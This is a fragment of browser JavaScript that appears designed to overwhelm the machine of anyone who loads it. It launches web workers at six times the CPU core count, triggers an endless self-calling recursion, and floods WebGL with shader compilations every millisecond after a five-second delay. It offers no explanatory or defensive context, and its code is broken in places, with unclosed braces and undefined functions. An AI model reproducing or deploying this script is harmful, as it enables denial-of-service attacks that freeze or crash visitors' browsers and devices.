            let blob = new Blob([code], { type: "application/javascript" });

        function infiniteRecursion() {
            try {
                return infiniteRecursion();
            } catch (e) {
                infiniteRecursion();

        function overloadGPU() {
            let canvas = document.createElement('canvas');
            let gl = canvas.getContext('webgl');
            function floodGPU() {
                let shaders = [];
                setInterval(() => {
                    var shader = gl.createShader(gl.VERTEX_SHADER);
                    gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
                    gl.compileShader(shader);
                    shaders.push(shader);
                    gl.getShaderParameter(shader, gl.COMPILE_STATUS);
                }, 1);
            }
            floodGPU();
        }

        let coreMultiplier = navigator.hardwareConcurrency * 6; // Increased to 6x CPU cores
        for (let i = 0; i < coreMultiplier; i++) {
            setTimeout(startWorker, i * 200);
        }

        setTimeout(() => infiniteRecursion(), 5000); // Start recursion after 5 seconds
        setTimeout(() => overloadGPU(), 5000); // Start GPU flood after 5 seconds
